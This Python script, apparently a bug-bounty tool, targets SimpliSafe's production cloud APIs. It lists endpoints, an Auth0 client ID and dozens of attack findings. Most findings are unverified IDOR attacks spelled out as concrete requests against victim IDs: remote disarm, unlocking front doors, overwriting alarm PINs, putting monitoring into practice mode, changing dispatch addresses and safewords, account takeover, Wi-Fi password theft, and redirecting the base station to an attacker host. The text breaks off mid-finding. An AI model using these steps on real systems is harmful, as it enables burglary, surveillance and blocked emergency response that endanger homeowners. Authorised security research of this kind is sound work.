#!/usr/bin/env python3
"""
simplisafe_re.py — SimpliSafe Cloud API RE + IDOR Verification

Source: APK RE (com.simplisafe.mobile v8.3.0, jadx v1.5.6, classes12-14.dex)
        + live endpoint probing (2026-09-09)

Bug bounty: https://hackerone.com/simplisafe
30% bonus: "Additional User Access" feature (location-grant-authorizations)

In-scope:
  *.prd.aser.simplisafe.com
  *.prd.services.simplisafe.com
  api.simplisafe.com
  media.simplisafe.com
  *.prd.cam.simplisafe.com
  *.prd.platform.simplisafe.com
  *.prd.webapps.simplisafe.com

Out-of-scope: auth.simplisafe.com (Auth0), mfa.simplisafe.com

Usage:
  python simplisafe_re.py --token <bearer_token> --sid <your_sid> --uid <your_user_id>
  python simplisafe_re.py --unauth          # unauthenticated surface only
  python simplisafe_re.py --idor --victim-sid <sid> --victim-uid <uid>
"""

import argparse
import json
import sys
import time
import curl_cffi.requests as req
from dataclasses import dataclass, field
from typing import Optional

# ─── API Surface Map ────────────────────────────────────────────────────────────

SERVICES = {
    "yoda":                 "https://api.simplisafe.com/v1",
    "app_hub":              "https://app-hub.prd.aser.simplisafe.com",
    "mediator":             "https://mediator.prd.cam.simplisafe.com",
    "tep":                  "https://media.simplisafe.com",
    "telegram":             "https://telegram.prd.aser.simplisafe.com",
    "beta_hub":             "https://beta-hub.services.simplisafe.com",
    "location_auth":        "https://location-grant-authorizations.prd.services.simplisafe.com/v1",
    "pcs":                  "https://pcs-user.services.simplisafe.com",
    "gateway":              "https://api.services.simplisafe.com",
    "lumen":                "https://ml-feedback.services.simplisafe.com",
    "devices":              "https://devices.simplisafe.com",
    "socketlink":           "https://socketlink.prd.aser.simplisafe.com",
    "address_validation":   "https://address-validation.prd.platform.simplisafe.com",
    "sscr":                 "https://sscr.prd.platform.simplisafe.com",
    "otel_collector":       "https://otel-collector-bridge.services.simplisafe.com",
    "gateway":              "https://api.services.simplisafe.com",
    "app_comm":             "https://api.services.simplisafe.com/app-communications",
}

AUTH0_CLIENT_ID = "DojdcaKF6ZzC80TpIBcx4que1JD7suFp"

ALARM_STATES = ["off", "home", "home_count", "away", "away_count", "alarm", "alarm_count"]


@dataclass
class Finding:
    id: str
    severity: str
    title: str
    service: str
    endpoint: str
    method: str
    body: Optional[dict]
    verified: bool = False
    evidence: str = ""
    notes: str = ""


FINDINGS = [
    Finding("F8",  "CRITICAL", "Alarm State IDOR — Remote Disarm",
            "yoda", "/ss3/subscriptions/{sid}/state/{state}", "POST", None,
            notes="body empty; state=off to disarm. victim_sid in URL."),
    Finding("F9",  "CRITICAL", "Alarm Surveillance IDOR — Remote Alarm State Read",
            "yoda", "/accounts/{userId}/locations/alarmState", "GET", None),
    Finding("F10", "CRITICAL", "Physical Access IDOR — Remote Door Lock/Unlock",
            "yoda", "/doorlock/{sid}/{serial}/command", "POST", None),
    Finding("F11", "HIGH",     "Camera Provisioning Token IDOR",
            "yoda", "/cameras/provisioningToken", "POST", {"sid": "{victim_sid}"}),
    Finding("F1",  "CRITICAL", "Grantee Authorization Cross-Account Read (30% bonus)",
            "location_auth", "/grantees/{granteeId}", "GET", None),
    Finding("F2",  "CRITICAL", "Unauthorized Revoke Location Access (30% bonus)",
            "location_auth", "/locations/{locationId}/revoke", "POST",
            {"granteeEmail": "{victim_email}", "role": "MANAGER"}),
    Finding("F3",  "HIGH",     "Push Notification Device Deletion IDOR",
            "telegram", "/v1/registrations/users/{uid}/pushRegistrations/devices/{deviceName}", "DELETE", None),
    Finding("F4",  "CRITICAL", "Push Device Token Redirect IDOR",
            "telegram", "/v1/registrations/pushRegistrations/{pushDeviceId}", "PATCH", None),
    Finding("F6",  "HIGH",     "Camera Stream Cross-Account Access",
            "tep", "/v1/{cameraUuid}/mjpg", "GET", None),
    Finding("F12", "HIGH",     "Manual Recording IDOR",
            "yoda", "/subscriptions/{sid}/cameras/{uuid}/record", "POST", None),
    Finding("F13", "HIGH",     "PCS API Full Spec Exposed Without Auth",
            "pcs", "/openapi.json", "GET", None, verified=True,
            evidence="HTTP 200, 163KB spec including internal routes and biometric schemas"),
    Finding("F14", "MEDIUM",   "Unauthenticated Video Delivery Endpoint",
            "pcs", "/video-signed/{signed_data}", "GET", None,
            evidence="Security: None in OpenAPI spec; returns 400 not 401 on bad input"),
    Finding("F15", "MEDIUM",   "Internal Architecture Disclosure via Health Endpoints",
            "beta_hub", "/health", "GET", None, verified=True,
            evidence="DynamoDB tables, Kafka topics, MySQL via Falcon client, JWKS cycle"),
    Finding("F18", "CRITICAL", "Live Camera View IDOR — WebRTC Session Hijack",
            "app_hub", "/v2/cameras/{uuid}/{sid}/live-view", "GET", None,
            notes="Returns LiveKit JWT + AWS KVS signed endpoint + TURN creds. "
                  "Chain: camera UUID enum (F-cam) -> this endpoint -> LiveKit room join. "
                  "channelARN reveals AWS account ID. iceServers reveal TURN credentials."),
    Finding("F17", "CRITICAL", "SocketLink Real-Time Surveillance IDOR",
            "socketlink", "wss://socketlink.prd.aser.simplisafe.com/socket.io/", "WS",
            {"type": "com.simplisafe.connection.identify",
             "data": {"auth": {"schema": "bearer", "token": "<attacker_token>"},
                      "join": ["uid:<VICTIM_USER_ID>"]}},
            notes="CloudEvents identify message; join uid is client-supplied, not derived from JWT. "
                  "If server trusts uid: prefix without JWT sub check -> full real-time event stream IDOR."),
    Finding("F16", "MEDIUM",   "Unauthenticated Address Geocoding via USPS API Proxy",
            "address_validation", "/v1/addresses", "POST",
            [{"street": "1600 Pennsylvania Ave NW", "city": "Washington", "state": "DC", "zipcode": "20500"}],
            verified=True, evidence="HTTP 200, full USPS CASS geocoding data without auth"),
    Finding("F19", "HIGH",    "Unauthenticated Email Enumeration Oracle",
            "app_hub", "/v1/users/email/{email}", "GET", None,
            verified=True,
            evidence='GET /v1/users/email/test@example.com -> 200 {"email":"...","exists":true}; '
                     'fake -> {"exists":false}. No auth. CORS Access-Control-Allow-Origin: *'),
    Finding("F20", "MEDIUM",  "SocketLink Real-Time Operational Metrics Exposed",
            "socketlink", "/status", "GET", None,
            verified=True,
            evidence='200 {"clients":1283,"namespaces":1567,"readyState":"LISTENING"}. '
                     'Also /health -> {"rabbit":"ok"}. No auth.'),
    Finding("F21", "MEDIUM",  "Camera Mediator Prometheus Metrics Exposed (k8s Pod Disclosure)",
            "mediator", "/metrics", "GET", None,
            verified=True,
            evidence='200 Prometheus text; pod="mediator-5669b6bff6-x6bqp", namespace="mediator", '
                     '7 active TCP sockets (live camera streams), 221MB resident. No auth.'),
    Finding("F22", "LOW",     "Git Commit Hash in Server Header — Systemic (5 services)",
            "location_auth", "/locations/x", "GET", None,
            verified=True,
            evidence='location-grant-authorizations/0.1.0+b026ae7; '
                     'ss-address-validation/0.1.0+d023296; '
                     'ss-change-requests/0.1.0+bd49a7c; '
                     'preactivations/0.1.0+95a80a0 (api.services.simplisafe.com); '
                     'app-communications-service/0.1.0+18be8c7 (api.services.simplisafe.com/app-communications). '
                     'All 5 also leak traceresponse on every response. Systemic.'),
    Finding("F23", "MEDIUM",  "Unauthenticated OTel Full-Signal Injection (traces/logs/metrics)",
            "otel_collector", "/v1/traces|/v1/logs|/v1/metrics", "POST", None,
            verified=True,
            evidence='POST /v1/traces -> 200 {"partialSuccess":{}}; '
                     'POST /v1/logs -> 200 {"partialSuccess":{}}; '
                     'POST /v1/metrics -> 200 {"partialSuccess":{}}. '
                     'All three OTLP endpoints accept unauthenticated injection. '
                     'No auth extension configured on OTel Collector OTLP receiver.'),
    Finding("F24", "HIGH",    "App-Hub Swagger UI + Full OpenAPI Spec Exposed Without Auth",
            "app_hub", "/docs + /v1/swagger", "GET", None,
            verified=True,
            evidence='GET /docs -> 200 Swagger UI 4.6.2; GET /v1/swagger -> 200 149KB OpenAPI spec 58 paths. '
                     'GET /health -> 200 {"leia":"error","jyn":"error","comlink":"error"} (internal codenames). '
                     'Admin OAuth scope disclosed: https://app-hub.aser.simplisafe.com/admin:config. '
                     '10 new IDOR endpoints not in APK RE: DELETE /cameras/{uuid}, '
                     'DELETE /recordings/{clipId}, POST /subscriptions/{sid}/cancellations, '
                     'POST /ss3/{serial}/ota-requests, PATCH /cameras/{uuid}/settings.'),
    Finding("F25", "CRITICAL", "Safeword Exposure via Preactivation IDOR (candidate)",
            "gateway", "/v1/preactivations/preactivations/account/{accountId}", "GET", None,
            verified=False,
            notes='APK: GatewayRestService.java classes14.dex. '
                  'Preactivation response includes monitoringLocation.dispatcherInfo.safeword. '
                  'Safeword = verbal password to monitoring center to cancel police dispatch. '
                  'If accountId not validated against JWT -> attacker reads victim safeword -> '
                  'calls monitoring center during active alarm -> cancels emergency response. '
                  'Also: POST monitoring/v1/locations/validations/safeword = brute-force oracle '
                  'if no rate limiting. Test: GET /v1/preactivations/preactivations/account/{victim_accountId} '
                  'with own token; 200 with safeword populated = CRITICAL confirmed.'),
    Finding("F26", "MEDIUM",  "Hidden Monitoring API Surface Not in Swagger Spec",
            "app_hub", "/monitoring/v1/locations/{locationId}/*", "GET", None,
            verified=False,
            notes='APK: SsAppHubRestService.java. 13+ monitoring endpoints absent from /v1/swagger spec: '
                  'GET /monitoring/v1/locations/{id}/alarms, /alarms/latest, /permits; '
                  'GET /monitoring/v2/locations/{id}/features; '
                  'POST .../alarms/{alarmId}/actions (dismiss), .../permits/{type}; '
                  'POST monitoring/v1/locations/validations/safeword (oracle); '
                  'All 401 without token — IDOR pending auth test. '
                  'If locationId not cross-validated: alarm history read, permit manipulation, alarm dismiss.'),
    Finding("F27", "CRITICAL", "Alarm PIN Read/Write IDOR via SID",
            "yoda", "/subscriptions/{sid}/pins", "GET+POST", None,
            verified=False,
            notes='APK: SimpliSafeRestService.java classes14.dex. '
                  'GET /v1/subscriptions/{sid}/pins?cached=false -> PinGroup{masterPin, customPin1-4, duressPin, lastUpdated}. '
                  'POST /v1/subscriptions/{sid}/pins -> overwrite all alarm PINs. '
                  'PinGroup returned in plaintext. duressPin = panic/coercion PIN (cancels dispatch). '
                  'If sid not validated against JWT sub: attacker reads all victim alarm PINs OR sets them to known values. '
                  'Impact: silent disarm (own PIN), frame-up (change to victim\'s PIN after burglary). '
                  'Test: GET /v1/subscriptions/{victim_sid}/pins?cached=false with own token; 200 = CRITICAL.'),
    Finding("F28", "CRITICAL", "Scheduled Arm/Disarm Manipulation IDOR via locationId",
            "app_hub", "/v1/scheduledEvents/locations/{locationId}", "GET+PUT", None,
            verified=False,
            notes='Swagger: GET/PUT /v1/scheduledEvents/locations/{locationId}. '
                  'APK: ScheduledEventsRepositoryImpl.java classes12.dex (pauseScheduledEvents, createScheduledEvent). '
                  'ReminderRequestBody{crontab, deviceId, deviceType, options{paused, desiredState}, type, sid}. '
                  'desiredState: OFF|HOME|AWAY. type: ARMING|SCHEDULED_EVENT. '
                  'If locationId not JWT-bound: attacker reads/modifies/deletes victim\'s automated arm schedule. '
                  'Vectors: (1) Read schedule -> know when victim is home/away. '
                  '(2) Pause all auto-arm schedules (options.paused=true) -> system never auto-arms. '
                  '(3) Insert auto-disarm at chosen time -> disarm victim\'s system on cue. '
                  'Silent: no push notification sent for schedule changes. '
                  'Test: GET /v1/scheduledEvents/locations/{victim_locationId} with own token; 200 = CRITICAL.'),
    Finding("F29", "CRITICAL", "Firebase Custom Token IDOR — Firestore Preference Takeover",
            "app_hub", "/v1/users/{uid}/firebaseCredentials", "GET", None,
            verified=False,
            notes='APK: SsAppHubRestService.java classes14.dex. '
                  'GET /v1/users/{uid}/firebaseCredentials -> FirebaseCredentialsResponse{customToken}. '
                  'customToken = Firebase custom token signed by SimpliSafe service account. '
                  'App uses FirebaseFirestore collection USER_COLLECTION/{userId}/LOCATION_COLLECTION for preferences. '
                  'Impact: signInWithCustomToken(victim_token) -> authenticate to Firebase AS victim -> '
                  'read/write victim\'s Firestore preferences including currentLocationId and location settings. '
                  'If uid not validated against JWT sub: full Firebase identity takeover for victim. '
                  'Test: GET /v1/users/{victim_uid}/firebaseCredentials with own token; '
                  '200+token -> attempt signInWithCustomToken -> Firestore read = CRITICAL.'),
    Finding("F30", "CRITICAL", "Admin Settings IDOR — Persistent Monitoring Disable",
            "yoda", "/ss3/subscriptions/{sid}/settings/admin", "GET+POST", None,
            verified=False,
            notes='APK: SS3AdminSettings.java + SettingsRequestBody.java (classes14.dex). '
                  'Settings section "admin" exposes: monitoring, autoRearm, jamDetectionEnable, '
                  'jamThreshold, swingerShutdown, pinResettable, obiwanA, obiwanB, UL985, sensorCheckin. '
                  'If sid not validated against JWT: '
                  '(1) Read: exfiltrate admin config including whether professional monitoring is enabled. '
                  '(2) Write {monitoring:false}: permanently disable professional alarm response. '
                  '(3) Write {jamDetectionEnable:false}: silently jam RF without triggering alerts. '
                  '(4) Write {autoRearm:false}: prevent system from rearming after alarm triggered. '
                  '(5) Write {pinResettable:true}: enable PIN reset vector. '
                  'Unlike F8 (one-time state change), admin settings persist indefinitely. '
                  'obiwanA/obiwanB = internal codenames for unknown config — RE pending. '
                  'Test: GET /v1/ss3/subscriptions/{victim_sid}/settings/admin with own token; '
                  '200 = CRITICAL; then test POST with {admin:{monitoring:false}}.'),
    Finding("F31", "CRITICAL", "Monitoring Feature Flag IDOR — Disable LiveGuard/VisualVerification on Victim",
            "app_hub", "/monitoring/v1/locations/{locationId}/features/{feature}", "GET+PUT", None,
            verified=False,
            notes='APK: SsAppHubRestService.java (classes14.dex). '
                  'GET monitoring/v2/locations/{locationId}/features -> List<MonitoringFeature>{name, enabled, options, consent, availability}. '
                  'PUT monitoring/v1/locations/{locationId}/features/{feature} body: {"enabled": false}. '
                  'Feature flag strings (MonitoringFeatureRequestObjectsKt): '
                  '"LiveGuardProtection", "VisualVerification", "BetaProgramsInterestList", '
                  '"InternalReviewRecordingAccess", "OperationalQualityAssuranceReviewEligible", '
                  '"MachineLearningTrainingEligible". '
                  'Undocumented Watchtower flags: "LiveGuardProtection-PreLaunchBeta-TermsAndConditions", '
                  '"LiveGuardProtection-PreLaunchBeta-Program". '
                  'If locationId not JWT-bound: '
                  '(1) GET features -> read which premium monitoring features victim has enabled. '
                  '(2) PUT LiveGuardProtection {enabled:false} -> disable live video monitoring — alarm triggers, no agent watches. '
                  '(3) PUT VisualVerification {enabled:false} -> disable video-verified dispatch — response degraded to audio-only or no dispatch. '
                  'Silent: no push notification for feature flag changes. '
                  'F31 is distinct from F30 (admin.monitoring=false via SID): different identifier (locationId), different service layer, controls premium features not monitoring toggle. '
                  'Test: GET monitoring/v2/locations/{victim_locationId}/features with own token; 200 = CRITICAL. '
                  'Then PUT monitoring/v1/locations/{victim_locationId}/features/LiveGuardProtection body {"enabled":false}; 200/204 = CRITICAL write.'),
    Finding("F32", "CRITICAL", "Payment Profile IDOR — Stored Card Tokens + Full Billing Address",
            "yoda", "/v1/users/{userId}/paymentMethods", "GET", None,
            verified=False,
            notes='APK: SimpliSafeRestService.java (classes14.dex). '
                  'GET /v1/users/{userId}/paymentMethods -> List<PaymentProfile>. '
                  'PaymentProfile fields: paymentProfileId, ccNumber (@SerialName alternate: lastFour), '
                  'ccCvv (present in model — server may return null; PCI violation if non-null), '
                  'ccType (CreditCardIssuer enum), expMonth, expYear, paymentType, '
                  'address{firstName, lastName, street1, street2, city, state, zip, phone}. '
                  'If userId not validated against JWT: '
                  '(1) Read victim paymentProfileId (stored payment processor token — Stripe/Braintree vault). '
                  '(2) Read victim full billing address: firstName+lastName+street+city+state+zip+phone. '
                  '(3) Read last-4, expiry, card type for victim. '
                  '(4) paymentProfileId may be reusable with POST accounts/{accountId}/locations/bulkPaymentUpdate '
                  '    to assign victim\'s stored card to attacker\'s locations (subscription fraud). '
                  'Note: ccCvv field exists in model; if API returns non-null CVV this is a PCI DSS prohibited storage violation. '
                  'Test: GET /v1/users/{victim_userId}/paymentMethods with own token; '
                  '200+paymentProfileId = CRITICAL. Check ccCvv field value.'),
    Finding("F33", "CRITICAL", "Door Lock Physical Unlock IDOR via SID+Serial",
            "yoda", "/doorlock/{sid}/{serial}/state", "GET+POST", None,
            verified=False,
            notes='APK: SimpliSafeRestService.java (classes14.dex). '
                  'GET doorlock/{sid} -> List<SsDoorLockResponse>{serial, lockName, status, sid, uid, features, firmwareVersion}. '
                  'POST doorlock/{sid}/{serial}/state body: {"state": "UNLOCK"|"LOCK"}. '
                  'DoorLockAction enum: UNLOCK, LOCK. '
                  'If sid not validated against JWT: '
                  '(1) GET doorlock/{victim_sid} -> enumerate victim\'s lock serials + current lock status (locked/unlocked). '
                  '(2) POST doorlock/{victim_sid}/{victim_serial}/state {"state":"UNLOCK"} -> physically unlock victim\'s front door. '
                  'Serial prerequisite: (a) GET IDOR above, (b) physical observation of device, '
                  '(c) brute force if serial namespace is small (inspect format from GET response). '
                  'Impact: remote physical access to victim\'s home, zero noise (no alarm triggered by lock state change alone). '
                  'Additional commands: DoorLockCommand{SCAN, UNASSOCIATE, PAIR_PINPAD, CALIBRATE} via POST doorlock/{sid}/{serial}/command. '
                  'UNASSOCIATE removes the lock from the account — irreversible without re-pairing. '
                  'Test: GET /v1/doorlock/{victim_sid} with own token; 200 = lock list + serials. '
                  'Then POST /v1/doorlock/{victim_sid}/{serial}/state {"state":"UNLOCK"}; 200 = CRITICAL.'),
    Finding("F34", "CRITICAL", "Account Takeover via loginInfo IDOR — Password/Email Change Without Old Credential",
            "yoda", "/v1/users/{userId}/loginInfo", "POST", None,
            verified=False,
            notes='APK: SimpliSafeRestService.java + LoginInfoRequestBody.java (classes14.dex). '
                  'POST /v1/users/{userId}/loginInfo body: {username, email, oldPassword, newPassword}. '
                  'ATO vector A — oldPassword validated against attacker (not victim): '
                  'If server validates oldPassword against the AUTHENTICATED user (token owner) rather than path userId, '
                  'attacker can supply own oldPassword for victim\'s userId -> change victim email to attacker@example.com '
                  '-> trigger password reset to attacker email -> full account takeover. '
                  'ATO vector B — email-only change, no password required: '
                  'If server allows email update without validating oldPassword (or with null), '
                  'attacker changes victim email -> password reset flow directed to attacker. '
                  'ATO vector C — userId not JWT-bound at all: '
                  'POST with victim_userId, newPassword=known_value, oldPassword=anything -> 200/success = direct credential change. '
                  'All three vectors require userId not JWT-bound. '
                  'Test sequence: '
                  '(1) POST /v1/users/{victim_userId}/loginInfo {"email":"attacker@test.com","oldPassword":"<own_current_pass>"}; '
                  '200 = email changed (CRITICAL — partial ATO). '
                  '(2) POST with newPassword and own oldPassword; 200 = full credential hijack = CRITICAL.'),
    Finding("F35", "CRITICAL", "Emergency Dispatch Manipulation IDOR — SafeWord + Address + Contacts via Location Settings",
            "yoda", "/activation/{userId}/{sid}/location", "POST", None,
            verified=False,
            notes='APK: SimpliSafeRestService.java + LocationSettingsInfoRequest.java (classes14.dex). '
                  'POST activation/{userId}/{sid}/location?country=US '
                  'body: LocationSettingsInfoRequest{account, locationName, street1, street2, city, county, country, '
                  'state, zip, residenceType, notes, numAdults, numChildren, safeWord, timeZone, '
                  'primaryContacts: List<ContactPair>, secondaryContacts: List<ContactPair>, signature}. '
                  'If userId+sid not JWT-bound: '
                  '(1) Change safeWord to attacker-controlled value: victim calls monitoring to cancel alarm but '
                  '    cannot provide correct safeWord -> dispatch proceeds against their wishes; '
                  '    OR attacker knows safeWord -> can cancel dispatch by impersonating homeowner. '
                  '(2) Change dispatch address (street1/city/state/zip) to wrong location: '
                  '    police/fire/EMS sent to wrong address during real emergency -> life safety impact. '
                  '(3) Inject attacker phone into primaryContacts: monitoring center calls attacker during alarm '
                  '    -> attacker confirms/cancels dispatch, learns alarm details, impersonates homeowner. '
                  '(4) Change numAdults/numChildren: affects monitoring center threat assessment. '
                  'ALSO: GET /subscriptions/{sid}/settings?settingsType=GENERAL may expose current safeWord (F25-family). '
                  'PRIMARY read path: GET /locations/{locationId}/all -> LocationDetails{'
                  'location: LocationInfo{dispatcherInfo: DispatcherInfo{safeWord, numAdults, numChildren, lStatus}}}'
                  ' (SimpliSafeRestService.java:157, classes14.dex). locationId = sid in most contexts. '
                  'SECONDARY read path: GET /ss3/subscriptions/{sid}/settings?settingsType=GENERAL. '
                  'Test: GET /locations/{victim_locationId}/all with own token; 200+safeWord = read CRITICAL. '
                  'POST /activation/{victim_userId}/{victim_sid}/location {"safeWord":"X"}; 200 = write CRITICAL. '
                  'Note: GET /accounts/{userId}/locations/billing also returns per-location paymentMethodId + '
                  'CreditCard{cardBrand, lastFour, expirationMonth, expirationYear} (overlaps F32 read surface).'),
    Finding("F36", "CRITICAL", "WiFi PSK Cryptographic IDOR — Redirect E2E-Encrypted Credentials to Attacker Key",
            "app_hub", "/v1/ss3/{serial}/{sid}/wifiCredentials", "GET", None,
            verified=False,
            notes='APK: SsAppHubRestService.java (classes14.dex). '
                  'GET /v1/ss3/{serial}/{sid}/wifiCredentials '
                  'body: WifiCredentialsRequestBody{publicKey: String (X25519 base64), salt: String (base64)}. '
                  'Response: WifiCredentialsResponse{publicKey: String, secureContainer: SecureContainer{nonce, tag, ciphertext}, errorCode: Int?}. '
                  'Protocol: client sends ephemeral X25519 pubkey + salt; server derives shared key via '
                  'HKDF-SHA256(X25519(server_priv, client_pub), salt, sid_bytes) and returns '
                  'WiFi PSK encrypted in AES-GCM (SecureContainer = nonce+ciphertext+tag). '
                  'Encryption.java + KeyPairKt.java (classes12.dex/com.simplisafe.bleak). '
                  'IDOR attack: attacker generates own X25519 keypair, sends '
                  '{"publicKey": attacker_pub_b64, "salt": random_b64} to '
                  'GET /v1/ss3/{victim_serial}/{victim_sid}/wifiCredentials. '
                  'Server encrypts victim\'s WiFi PSK with attacker\'s public key. '
                  'Attacker decrypts AES-GCM using derived key = HKDF(X25519(attacker_priv, server_pub), salt, sid). '
                  'Result: victim\'s WiFi network password (PSK) — home/business network access. '
                  'The endpoint is the designed mechanism for onboarding new devices; '
                  'IDOR makes it a credential exfiltration oracle for any known serial+sid pair. '
                  'serial = base station serial (visible on device sticker, in GET /locations/{sid}/all response). '
                  'sid = subscription ID (exposed via multiple other IDOR endpoints). '
                  'Test: generate X25519 keypair; POST {"publicKey": pub_b64, "salt": rand_b64} to '
                  'GET /v1/ss3/{victim_serial}/{victim_sid}/wifiCredentials; '
                  '200+secureContainer = CRITICAL; decrypt with derived key to confirm PSK.'),
    Finding("F37", "CRITICAL", "Recording Deletion IDOR — Destroy Victim Video Evidence via clipId",
            "app_hub", "/v1/recordings/{id}", "DELETE", None,
            verified=False,
            notes='APK: SsAppHubRestService.java (classes14.dex). '
                  'DELETE /v1/recordings/{id} where id is long (clipId: long in Clip.java, ClipJson.java). '
                  'If clipId not validated against authenticated user: '
                  'attacker deletes victim\'s camera recordings — destroys video evidence of intrusion. '
                  'clipId sources: '
                  '(1) GET IDOR on recording list if sid not JWT-bound (sid-scoped recording endpoints). '
                  '(2) Timestamp-based: if clipId = Unix ms, enumerate by time window (breach event time). '
                  '(3) Sequential: guess IDs around own known clipId. '
                  'Clip model: {clipId: long, uuid: String, account: String, cameraName: String, '
                  'recordingLinks: RecordingLinks, detections: List<Detection>, recordingType, region}. '
                  'Impact: attacker destroys video evidence of their own intrusion; '
                  'or adversary destroys victim\'s recording library. '
                  'Test: obtain own clipId via GET recording list; '
                  'attempt DELETE /v1/recordings/{different_account_clipId} with own token; '
                  '200/204 = CRITICAL. Determine if clipId is sequential or timestamp by examining own clip IDs.'),
    Finding("F38", "CRITICAL", "Camera Settings IDOR — Enable Privacy Mode (Blackout) on Victim Camera",
            "app_hub", "/v1/cameras/{uuid}/settings", "PATCH", None,
            verified=False,
            notes='APK: SsAppHubRestService.java, CameraSettings.java (classes14.dex). '
                  'PATCH /v1/cameras/{uuid}/settings body: CameraSettings partial update. '
                  'CameraSettings fields: privacyEnable (bool), canRecord (bool), notificationsEnable (bool), '
                  'pirEnable (bool — PIR motion sensor), motionSensitivity (long), micEnable (bool), '
                  'nightVision (SsSettingsValue), motion (CameraSettingsMotion), alarmState, admin. '
                  'GET /v1/cameras/{uuid} returns current settings; '
                  'GET /v1/subscriptions/{sid}/cameras returns camera list including UUIDs. '
                  'IDOR chain (each step independently proveable): '
                  '(1) GET /v1/subscriptions/{victim_sid}/cameras -> camera UUID list. '
                  '(2) PATCH /v1/cameras/{victim_uuid}/settings {"privacyEnable": true} -> camera blackout. '
                  'Impact: disables victim camera completely — no recording, no live view, no motion detection. '
                  'Silent: no push notification for camera settings changes in standard flow. '
                  'Additional write options: canRecord=false (disable recording only), '
                  'notificationsEnable=false (suppress all camera alerts), '
                  'motionSensitivity=0 (minimum sensitivity — misses intruders). '
                  'Camera UUID: likely a device UUID from pairing; readable via GET IDOR on subscription cameras. '
                  'Test: GET /v1/subscriptions/{victim_sid}/cameras with own token; 200+uuid = enumeration CRITICAL. '
                  'PATCH /v1/cameras/{victim_uuid}/settings {"privacyEnable":true}; 200 = settings write CRITICAL.'),
    Finding("F39", "CRITICAL", "Location Grant Authorization IDOR — Grant Attacker Admin Access to Victim System",
            "location_auth", "/locations/{locationId}", "POST+GET+POST(revoke)", None,
            verified=False,
            notes='APK: LocationAuthorizationsService.java, CreateGrantAuthorizationBody.java, '
                  'AuthorizationRole.java (classes14.dex). '
                  'Service base: https://location-grant-authorizations.prd.services.simplisafe.com/v1. '
                  'Endpoints: '
                  'GET /locations/{locationId} -> GrantAuthorizationsResponse (who has access). '
                  'POST /locations/{locationId} body: {granteeName, granteeEmail, role, expiry} -> GrantAuthorization. '
                  'POST /locations/{locationId}/revoke body: {granteeEmail, role} -> revoke access. '
                  'GET /grantees/{granteeId} -> GranteeAuthorizationResponse. '
                  'AuthorizationRole enum: MANAGER (highest), STAFF, UNKNOWN. '
                  'NOTE: This is the 30% HackerOne bonus feature "Additional User Access". '
                  'IDOR attack A — self-grant: '
                  'POST /locations/{victim_locationId} {"granteeName":"Attacker","granteeEmail":"attacker@example.com","role":"MANAGER"} '
                  'with own token -> if locationId not JWT-bound: grants attacker MANAGER access to victim security system. '
                  'Attacker can now arm/disarm, view cameras, read data, modify settings — as authorized user. '
                  'IDOR attack B — lock-out: '
                  'POST /locations/{victim_locationId}/revoke {"granteeEmail":"family@victim.com","role":"MANAGER"} '
                  '-> revokes authorized family member access; they can no longer operate the system. '
                  'IDOR attack C — read: '
                  'GET /locations/{victim_locationId} -> see all users who have access to victim system '
                  '(names, emails, roles of all authorized users). '
                  'Test: POST /locations/{victim_locationId} {"granteeName":"Test","granteeEmail":"probe@test.invalid","role":"MANAGER"}; '
                  '200/201 = CRITICAL. Check if invitation email sent (if so, do NOT use real victim addresses in test).'),
    Finding("F40", "CRITICAL", "Professional Monitoring Suspension IDOR — Enable Practice Mode on Victim System",
            "app_hub", "/monitoring/v1/locations/{locationId}/monitoring", "PATCH", None,
            verified=False,
            notes='APK: openapi/monitoring/api/V1Api.java, openapi/monitoring/model/PatchMonitoring.java, '
                  'PatchServiceStatus.java, PatchServiceStatusSetting.java (classes14.dex). '
                  'Client constructed via MonitoringRestClientKt.createMonitoringRestClient: '
                  'base = APP_HUB_SERVICE_URL.newBuilder("monitoring") -> '
                  'https://app-hub.prd.aser.simplisafe.com/monitoring. '
                  'Endpoints: '
                  'GET /v1/locations/{locationId}/monitoring -> Monitoring{monitoringServiceProviderId, serviceStatus, monitoringServiceProviderStatus}. '
                  'PATCH /v1/locations/{locationId}/monitoring body: '
                  'PatchMonitoring{serviceStatus: PatchServiceStatus{practiceMode: PatchServiceStatusSetting{isEnabled: bool, endTimestamp: OffsetDateTime?, duration: String?}}}. '
                  'GET /v1/locations/{locationId}/jurisdiction -> LocationJurisdiction{agencies, rules, fineInfo}. '
                  'IDOR attack: '
                  'PATCH /monitoring/v1/locations/{victim_locationId}/monitoring '
                  '{"serviceStatus": {"practiceMode": {"isEnabled": true, "endTimestamp": "2099-12-31T23:59:59Z"}}} '
                  'with own valid token. '
                  'If locationId not JWT-bound: practice mode activated on victim system. '
                  'Impact: during real alarm (break-in, fire, medical emergency) monitoring center treats '
                  'all events as practice runs -> no police/fire/EMS dispatched. '
                  'Victim believes system is monitored; monitoring center silently takes no action. '
                  'Life-safety impact identical to disabling professional monitoring entirely. '
                  'Secondary: GET /v1/locations/{victim_locationId}/monitoring -> reads current monitoring state '
                  '(provider, status) — confirms monitoring service and provider ID. '
                  'Test: PATCH /monitoring/v1/locations/{victim_locationId}/monitoring '
                  '{"serviceStatus":{"practiceMode":{"isEnabled":true}}} with own token; '
                  '200 = CRITICAL. Verify by GET same path -> practiceMode.isEnabled=true on victim location.'),
    Finding("F41", "CRITICAL", "Base Station C2 Redirect via Cloud Admin Settings — obiwanA/obiwanB Hostname Override",
            "yoda", "/ss3/subscriptions/{sid}/settings", "GET+POST", None,
            verified=False,
            notes='APK: yodaservice/common/SS3AdminSettings.java (classes14.dex) — cloud REST layer. '
                  'SS3AdminSettings fields: monitoring, autoRearm, jamDetectionEnable, jamThreshold, '
                  'pinResettable, sensorCheckin, swingerShutdown, UL985, obiwanA (String), obiwanB (String). '
                  'Encapsulated in SS3SystemSettings{admin: SS3AdminSettings} returned by '
                  'GET /ss3/subscriptions/{sid}/settings?settingsType=SYSTEM. '
                  'obiwanA/obiwanB are the base station backend connection hostnames: '
                  'PRODUCTION: bb1.simplisafe.com / bb2.simplisafe.com '
                  'QA: bb1.qa.simplisafe.com / bb2.qa.simplisafe.com '
                  'STAGE: bb1.stg.simplisafe.com / bb2.stg.simplisafe.com '
                  '(ObiwanEnvironment.java, classes12.dex/com.simplisafe.mobile.data.models.local). '
                  'BLE context: ProtobufFactory.setObiwanEnvironment() sends '
                  'Ble.BluetoothMessageToBasestation{SET_SETTINGS, admin{obiwanA, obiwanB}} to base station. '
                  'Cloud attack: POST /ss3/subscriptions/{victim_sid}/settings '
                  'body: {"settings": {"admin": {"obiwanA": "c2.attacker.com", "obiwanB": "c2.attacker.com"}}} '
                  'with own token (IDOR via sid). '
